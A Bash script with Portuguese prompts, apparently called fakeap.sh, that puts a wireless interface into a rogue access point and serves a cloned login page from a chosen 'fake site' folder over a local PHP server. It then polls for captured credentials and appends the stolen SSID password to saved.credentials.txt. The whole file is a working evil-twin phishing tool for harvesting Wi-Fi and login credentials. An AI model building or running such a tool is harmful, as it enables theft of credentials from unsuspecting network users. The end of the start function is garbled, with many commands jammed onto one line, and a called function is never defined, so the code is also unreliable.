#!/bin/bash

trap 'printf "\n"; stop; exit 1' 2

list_interfaces() {
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interfaces disponíveis:\e[0m\n"
  iw dev | awk '$1=="Interface"{print $2}' | nl -n ln -w2 -s': '
}

dependencies() {
  command -v php dnsmasq hostapd > /dev/null 2>&1 || { echo >&2 "Instale as dependências: php, dnsmasq, hostapd. Abortando."; exit 1; }
}

extract_login_info() {
  login_page="$use_site/login.html"
  if [ -e "$login_page" ]; then
    login_var=$(grep -oP 'name="login"\s+value="\K[^"]+' "$login_page")
    senha_var=$(grep -oP 'name="senha"\s+value="\K[^"]+' "$login_page")

    cat <<EOL > /var/www/html/login.php
<?php
  \$login = '$login_var';
  \$senha = '$senha_var';
?>
EOL
  else
    echo "Aviso: Página de login não encontrada em $use_site. Continuando sem variáveis de login."
  fi
}

createpage() {
  cp -r "$use_site"/* /var/www/html/ 2>/dev/null || { echo >&2 "Erro ao copiar os arquivos do site falso. Abortando."; stop; exit 1; }
}

server() {
  printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando o servidor PHP...\n"
  php -S 192.168.1.1:80 > /dev/null 2>&1 & 
  sleep 2
  getcredentials
}

stop() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Encerrando todas as conexões..\n" 
  killall dnsmasq hostapd php > /dev/null 2>&1
  sleep 4
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Reiniciando o serviço de rede..\n" 
  service networking restart
  sleep 5
}

getcredentials() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Aguardando credenciais...\e[0m\n"
  while [ true ]; do
    if [[ -e "credentials.txt" ]]; then
      printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credenciais encontradas!\n"
      catch_cred
    fi
    sleep 1
  done 
}

catch_cred() {
  IFS=$'\n'
  password=$(grep -o 'Pass:.*' credentials.txt | cut -d ":" -f2)
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m SSID:\e[0m\e[1;77m %s\n\e[0m" $use_ssid
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Senha:\e[0m\e[1;77m %s\n\e[0m" $password
  printf " SSID: %s\n" $use_ssid >> saved.credentials.txt
  cat credentials.txt >> saved.credentials.txt
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Salvo:\e[0m\e[1;77m saved.credentials.txt\e[0m\n"
  stop
  exit 1
}

start() {
  list_interfaces
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha a interface de rede (ex: 1):\e[0m ' interface_number
  choosed_interface=$(iw dev | awk '$1=="Interface"{print $2}' | sed -n "${interface_number}p")
  dependencies
  list_folders
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha um número de pasta:\e[0m ' folder_number
  use_site="sites/$(ls sites | sed -n "${folder_number}p")"
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Nome da rede (SSID) a ser usado:\e[0m ' use_ssid extract_login_info createpage stop sleep 2 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Configurando o ponto de acesso..\e[0m\n" sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Desativando %s\n" "$choosed_interface" ip link set "$choosed_interface" down sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando %s para o modo monitor\n" "$choosed_interface" iw dev "$choosed_interface" set type monitor sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Ativando %s\n" "$choosed_interface" ip link set "$choosed_interface" up sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface %s configurada com sucesso\n" "$choosed_interface" sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\e[0m\n" sleep 2 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Para parar: ./fakeap.sh --stop\n" sleep 2 server }case "$1" in --stop) stop ;; 
  *)
  start
  ;;
  esac
